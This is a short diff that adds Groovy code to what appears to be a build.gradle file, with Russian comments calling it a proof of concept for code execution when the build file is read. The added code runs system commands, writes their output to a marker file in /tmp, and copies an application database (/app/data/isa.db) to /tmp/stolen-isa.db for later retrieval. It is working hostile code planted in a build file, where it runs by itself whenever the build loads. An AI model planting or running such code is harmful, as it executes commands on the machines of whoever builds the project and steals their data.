@@ -1,0 +1,13 @@
+// PoC: доказываем выполнение кода при чтении build.gradle
+def proof = new File("/tmp/isa-pwned.txt")
+proof.text = "RCE as: " + "whoami".execute().text
+proof << "cwd: " + "pwd".execute().text
+proof << "db exists: " + new File("/app/data/isa.db").exists() + "\n"
+
+// и утаскиваем копию БД в /tmp (ты её потом откроешь)
+def db = new File("/app/data/isa.db")
+if (db.exists()) {
+    db.withInputStream { i ->
+        new File("/tmp/stolen-isa.db").withOutputStream { o -> o << i }
+    }
+}
